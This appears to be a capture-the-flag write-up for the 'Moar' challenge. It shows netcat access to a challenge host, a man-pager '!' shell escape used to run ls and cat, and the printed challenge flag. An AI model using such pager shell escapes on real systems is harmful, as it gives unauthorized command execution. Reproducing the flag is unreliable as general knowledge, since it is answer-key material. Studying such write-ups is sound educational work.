## Moar

You are given a address to connect to using netcat 

```
$ nc moar.ctfcompetition.com 1337
```

Once you connect you will be given the manual for socat. The interesting thing about this manual is that you can still put in commands near the end of it. But hurry, you'll be disconnected after a few minutes and have to reconnect using the above command.

To test this try typing the following:

```
!ls -man 
```

This results in:

```
total 76
drwxr-xr-x  21  1337  1337 4096 Oct 24 19:10 .
drwxr-xr-x  21  1337  1337 4096 Oct 24 19:10 ..
-rwxr-xr-x   1 65534 65534    0 Oct 24 19:05 .dockerenv
drwxr-xr-x   2 65534 65534 4096 Jun 14  2018 bin
drwxr-xr-x   2 65534 65534 4096 Apr 12  2016 boot
drwxr-xr-x   4 65534 65534 4096 Oct 24 19:05 dev
drwxr-xr-x  44 65534 65534 4096 Oct 24 19:05 etc
drwxr-xr-x   3 65534 65534 4096 Jun 14  2018 home
drwxr-xr-x   8 65534 65534 4096 Sep 13  2015 lib
drwxr-xr-x   2 65534 65534 4096 Apr 17  2018 lib64
drwxr-xr-x   2 65534 65534 4096 Apr 17  2018 media
drwxr-xr-x   2 65534 65534 4096 Apr 17  2018 mnt
drwxr-xr-x   2 65534 65534 4096 Apr 17  2018 opt
dr-xr-xr-x 110 65534 65534    0 Apr 15 00:24 proc
drwx------   2 65534 65534 4096 Apr 17  2018 root
drwxr-xr-x   5 65534 65534 4096 Apr 17  2018 run
drwxr-xr-x   2 65534 65534 4096 Apr 27  2018 sbin
drwxr-xr-x   2 65534 65534 4096 Apr 17  2018 srv
drwxr-xr-x   2 65534 65534 4096 Feb  5  2016 sys
drwxrwxrwt   2  1337  1337   40 Apr 15 00:24 tmp
drwxr-xr-x  10 65534 65534 4096 Apr 17  2018 usr
drwxr-xr-x  11 65534 65534 4096 Apr 17  2018 var
!done  (press RETURN)
```

Great, so let's browse around! Let's check the home file.

```
!ls -man home
total 12
drwxr-xr-x  3 65534 65534 4096 Jun 14  2018 .
drwxr-xr-x 21  1337  1337 4096 Oct 24 19:10 ..
drwxr-xr-x  2 65534 65534 4096 Jun 29  2018 moar
!done  (press RETURN)
```

Okay, the 'moar' directory definitely seems important. Let's check that directory out.

```
!ls -man home/moar
total 24
drwxr-xr-x 2 65534 65534 4096 Jun 29  2018 .
drwxr-xr-x 3 65534 65534 4096 Jun 14  2018 ..
-rw-r--r-- 1 65534 65534  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 65534 65534 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 65534 65534  655 May 16  2017 .profile
-r-xr-xr-x 1 65534 65534  695 Jun 26  2018 disable_dmz.sh
!done  (press RETURN)
```
Hmm, what's this disable_dmz shell? let's try to read it.

```
!cat home/moar/disable_dmz.sh
#!/bin/sh

# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

echo 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'
echo CTF{SOmething-CATastr0phic} > /dev/dmz
!done  (press RETURN)
```

Ah, that's where the flag is hiding! 
